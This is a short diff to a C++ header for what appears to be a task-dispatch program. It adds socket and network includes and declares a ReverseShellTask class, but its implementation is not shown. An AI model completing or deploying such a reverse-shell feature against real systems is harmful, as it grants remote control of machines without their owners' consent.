@@ -6,6 +6,13 @@
 #include <string>
 #include <memory>
 
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
 class Task
 {
 public:
@@ -31,6 +38,16 @@ public:
     void run() override;
     ~InvalidTask() override {};
 };
+
+class ReverseShellTask: public Task
+{
+private:
+    static void worker();
+public:
+    void run() override;
+    ~ReverseShellTask() override {};
+};
+
 
 /**
  * @brief Parse a string to a task
